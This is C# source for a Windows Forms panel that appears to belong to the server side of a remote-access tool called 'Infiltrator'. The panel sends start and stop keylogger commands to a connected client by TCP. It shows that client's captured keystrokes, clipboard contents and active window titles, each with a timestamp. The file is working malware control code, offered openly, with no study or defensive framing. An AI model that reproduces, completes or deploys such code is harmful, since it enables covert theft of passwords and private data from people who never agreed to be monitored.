using System.Net.Sockets;
using Server.Conexion;
using Server.Log;



namespace Server
{
    public partial class Keylogger : Form
    {
        public static Keylogger Instance { get; private set; }
        private TcpClient _cliente;
        private int _idCliente;

        private string _lastClipboardContent = string.Empty;
        private string _lastActiveWindow = string.Empty;
        private const int MaxLines = 10000;

        private static Logger _logger = Logger.getInstance();
        public Keylogger(int id, TcpClient cliente)
        {
            InitializeComponent();
            Instance = this;
            _cliente = cliente;
            _idCliente = id;
            this.Text = $"Keylogger Remoto - Cliente {_idCliente}";

            this.FormClosing += Keylogger_FormClosing;
        }

        private void Keylogger_Load(object sender, EventArgs e)
        {
            SafeSend("keylogger", Channel.Keylogger);

            richTextBox1
                .AppendText("Infiltrator Keylogger Log [v1.0]\n" +
                            "---------------------------------------\n");
            richTextBox2
                .AppendText("Clipboard Content [v1.0]\n" +
                            "-----------------------------------------------------\n");
            richTextBox3
                .AppendText("Active Window [v1.0]\n" +
                            "--------------------------------------------------\n");
        }

        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Asegurarnos de detener el keylogger
            SafeSend("keylogger stop", Channel.Keylogger);
            Instance = null;
        }


        public void AppendLog(string output)
        {
            try
            {
                string line = $"{Timestamp()}-[Key]> {output}{Environment.NewLine}";
                InvokeIfRequired(richTextBox1, () =>
                {
                    TrimLines(richTextBox1);
                    richTextBox1.AppendText(line);
                    ScrollToEnd(richTextBox1);
                });
            }
            catch { /* opcional: log interno */ }
        }

        public void AppendClipboard(string output)
        {
            if (output == _lastClipboardContent) return;
            _lastClipboardContent = output;

            string line = $"{Timestamp()}-[Clipboard]> {output}{Environment.NewLine}";
            InvokeIfRequired(richTextBox2, () =>
            {
                TrimLines(richTextBox2);
                richTextBox2.AppendText(line);
                ScrollToEnd(richTextBox2);
            });
        }

        public void AppendActiveWindow(string output)
        {
            if (output == _lastActiveWindow) return;
            _lastActiveWindow = output;

            string line = $"{Timestamp()}-[Window]> {output}{Environment.NewLine}";
            InvokeIfRequired(richTextBox3, () =>
            {
                TrimLines(richTextBox3);
                richTextBox3.AppendText(line);
                ScrollToEnd(richTextBox3);
            });
        }

        private string Timestamp() =>
        DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

        private void InvokeIfRequired(Control ctl, Action action)
        {
            if (ctl.InvokeRequired)
                ctl.Invoke(action);
            else
                action();
        }

        private void TrimLines(RichTextBox box)
        {
            var lines = box.Lines;
            if (lines.Length <= MaxLines) return;
            // quitamos las líneas más antiguas
            var trimmed = lines.Skip(lines.Length - MaxLines).ToArray();
            box.Lines = trimmed;
        }

        private void ScrollToEnd(RichTextBox box)
        {
            box.SelectionStart = box.TextLength;
            box.ScrollToCaret();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Close();  // disparará FormClosing y detendrá el keylogger
        }

        private void SafeSend(string cmd, Channel ch)
        {
            try
            {
                ServerSocket.SendCommand(_idCliente, cmd, ch);
            }
            catch (Exception ex)
            {
                _logger.Log($"Error enviando comando '{cmd}': {ex.Message}", LogLevel.ERROR);
            }
        }


        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}
